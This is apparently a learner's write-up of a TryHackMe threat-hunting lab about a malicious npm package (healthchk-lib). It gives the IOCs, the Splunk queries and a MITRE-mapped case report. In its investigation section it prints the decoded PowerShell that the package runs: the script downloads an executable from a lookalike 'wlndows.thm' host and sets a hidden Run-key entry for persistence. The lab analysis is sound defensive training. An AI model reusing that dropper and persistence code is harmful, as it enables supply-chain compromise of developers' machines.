# TryHackMe: Threat Hunting Simulation: Health Hazard 

Simulation Link: https://tryhackme.com/threat-hunting-sim/scenarios?scenario=health-hazard


### **Briefing**

After months of juggling content calendars and caffeine-fueled brainstorming, co-founder Tom Whiskers finally carved out time to build the company’s first website. It was supposed to be simple: follow a tutorial, install a few packages, and bring the brand to life with lightweight JavaScript magic.

But between sleepless nights and copy-pasted code, Tom started feeling off. Not sick exactly, just off. The terminal scrolled with reassuring green text, the site loaded fine, and everything looked normal.

But no one really knows what might have been hidden beneath it all…

It just waited.

### **Hypothesis**

An attacker may have leveraged a compromised third-party software package to gain initial access to the system and silently stage a payload for later execution. They likely established persistence to maintain access without immediate detection.

### **Objectives**

- Determine how a threat actor first gained a foothold on the system. Identify suspicious activity that may point to the initial compromise method.
- Investigate signs of malicious execution following the initial access. Analyse the logs and system behaviour to uncover the attacker's actions.
- Identify any mechanisms the attacker used to maintain access across system restarts or user sessions. Look for indicators of persistence that

Your task as a Threat Hunter is to conduct a comprehensive hunting session in the TryGovMe environment to identify potential anomalies and threats. You are expected to:

1. **Validate a Hunting Hypothesis:** Investigate the given hypothesis and determine - based on your findings - whether it is valid or not.
2. **Review IOCs from External Sources:** Analyse the list of Indicators of Compromise provided by security teams from compromised     partner organisations. These may lead you to uncover additional malicious activity or pivot points.
3. **Reconstruct the Attack Chain:** Perform a detailed investigation within the environment and reconstruct the attack chain, starting from the initial point of compromise to the attacker's final objective.
4. **Determine the Scope of the Incident:** Identify the impacted users, systems, and assets. Understanding the full scope is critical for response and containment.
5. **Generate a Final Threat Hunting Report:** Based on your findings and the reconstructed attack chain, compile a final Threat Hunting report highlighting the key observations and affected entities.

## **Host-Based IOCs**

| **Type** | **Value** |
| --- | --- |
| NPM Package | `healthchk-lib@1.0.1` |
| Registry Path | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
| Registry Value Name | `Windows Update Monitor` |
| Registry Value Data | `powershell.exe -NoP -W Hidden -EncodedCommand <base64>` |
| Downloaded File Path | `%APPDATA%\SystemHealthUpdater.exe` |
| PowerShell Command | `Invoke-WebRequest -Uri ... -OutFile ...` |
| Process Execution | `powershell.exe -NoP -W Hidden -EncodedCommand ...` |
| Script Artifact | Found in `package.json` under `"postinstall"` |

## **Network-Based IOCs**

| **Type** | **Value** |
| --- | --- |
| Download URL | `http://global-update.wlndows.thm/SystemHealthUpdater.exe` |
| Hostname Contacted | `global-update.wlndows.thm` |
| Protocol | HTTP (unencrypted) |
| Port | 80 |
| Traffic Behavior | Outbound file download to `%APPDATA%` via PowerShell |

---

## Investigation

**1. NPM Package Detection**

```
* "healthchk-lib@1.0.1" 
| stats count by _time,host CommandLine 
| sort - count
```

<img width="1910" height="767" alt="image" src="https://github.com/user-attachments/assets/a14c2eff-4182-4cf6-97b3-d1d9d74b5273" />

- Time: 21/06/2025 10:58:27.000
- **host**: PAW-TOM
- **ParentCommandLine**: "C:\Program Files\nodejs\node.exe" "C:\Program Files\nodejs/node_modules/npm/bin/npm-cli.js" install healthchk-lib@1.0.1
- **CommandLine**: C:\Windows\system32\cmd.exe /d /s /c powershell.exe -NoP -W Hidden -EncodedCommand <base64>

Decoded command:

```powershell
$dest = "$env:APPDATA\SystemHealthUpdater.exe"
$url = "http://global-update.wlndows.thm/SystemHealthUpdater.exe"

# Download file
Invoke-WebRequest -Uri $url -OutFile $dest

# Base64 encode the command
$encoded = [Convert]::ToBase64String(
    [Text.Encoding]::Unicode.GetBytes("Start-Process '$dest'")
)

# Build persistence command
$runCmd = 'powershell.exe -NoP -W Hidden -EncodedCommand ' + $encoded

# Add to registry for persistence
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
    -Name 'Windows Update Monitor' -Value $runCmd
```

This script downloads a file named **`SystemHealthUpdater.exe`** from a suspicious domain (**`wlndows.thm`),** and save it ****to the user's **`%APPDATA%`** folder. Then it establishes a persistence by creating a new entry in the Windows Registry under the current user's **Run key** with the name **`Windows Update Monitor`**

**2. Check the execution of the script**

```powershell
* ParentProcessId="1616"
```

<img width="1489" height="816" alt="image" src="https://github.com/user-attachments/assets/0ecc73b2-a46a-475b-9264-ed18eefd1b2b" />

- **timestamp**: 21/06/2025 10:58:27.000
- **CommandLine**: powershell.exe -NoP -W Hidden -EncodedCommand <base64>

1. **Check Registry Modification**

```powershell
* SourceName="Microsoft-Windows-Sysmon" EventCode=13
| table _time,host,TargetObject
```

<img width="1905" height="308" alt="image" src="https://github.com/user-attachments/assets/12d6ea9a-43a0-4c80-a894-d0c4d885b87b" />

<img width="1503" height="776" alt="image" src="https://github.com/user-attachments/assets/5b9e7f66-a9cc-4286-a926-f201bde1eae5" />

- Time: 2025-06-21 10:58:29
- CommandLine: powershell.exe -NoP -W Hidden -EncodedCommand <base64>
- TargetObject: HKU\S-1-5-21-1966530601-3185510712-10604624-500\Software\Microsoft\Windows\CurrentVersion\Run\Windows Update Monitor
- TaskCategory: Registry value set (rule: RegistryEvent)

---

# **Cyber Attack Case Report**

## **Executive Summary**

This report outlines a sophisticated cyber attack involving three distinct stages: Initial Access, Execution, and Persistence. The attack was executed against the user `tom@pawpress.me` on the asset `paw-tom` on June 21, 2025.

### **Stage 1: Initial Access**

- **Description:** The compromise began when the user downloaded a malicious package, `healthchk-lib@1.0.1`, which led to PowerShell command execution.
- **Tactic & Technique:** Initial Access (TA0001), Supply Chain Compromise (T1195).
- **Indicators of Compromise (IOC):**
    - Parent Command Line: `"C:\Program Files\nodejs\node.exe" "C:\Program Files\nodejs/node_modules/npm/bin/npm-cli.js" install healthchk-lib@1.0.1`.
    - Command Line: `C:\Windows\system32\cmd.exe /d /s /c powershell.exe -NoP -W Hidden -EncodedCommand <base64>`.

### **Stage 2: Execution**

- **Description:** A PowerShell command executed an encoded script, which downloaded a malicious binary from `http://global-update.wlndows.thm/SystemHealthUpdater.exe`.
- **Tactic & Technique:** Execution (TA0002), Command and Scripting Interpreter (T1059).
- **IOC:**
    - Command Line: `C:\Windows\system32\cmd.exe /d /s /c powershell.exe -NoP -W Hidden -EncodedCommand <base64 encode>`.
    - URL: `http://global-update.wlndows.thm/SystemHealthUpdater.exe`.

### **Stage 3: Persistence**

- **Description:** The adversary established persistence by creating a registry Run Key.
- **Tactic & Technique:** Persistence (TA0003), Boot or Logon Autostart Execution (T1547).
- **IOC:**
    - Target Object: `HKU\S-1-5-21-1966530601-3185510712-10604624-500\Software\Microsoft\Windows\CurrentVersion\Run\Windows Update Monitor`.

## **Impact and Findings**

The attack demonstrates a well-structured attempt to gain and maintain access to the target system using supply chain compromise, scripting, and registry manipulation tactics. The persistence mechanism ensures the threat actor can reinitiate the attack on system reboot, posing ongoing risks to the user's security and data integrity. Immediate remediation actions are advised to mitigate potential damages and prevent further exploitation.

### Feedback:

<img width="1794" height="431" alt="image" src="https://github.com/user-attachments/assets/f1fcc8b0-af1f-4ee6-829c-7d5c991de7d6" />

<img width="1717" height="788" alt="image" src="https://github.com/user-attachments/assets/fe15be77-964a-4c28-9435-3e7b86d5e752" />

<img width="1835" height="813" alt="image" src="https://github.com/user-attachments/assets/2870709b-8f1c-4de2-9a44-4d4b2acfb360" />

<img width="729" height="699" alt="image" src="https://github.com/user-attachments/assets/6b29e71d-a185-4c46-967c-311c4b87453c" />
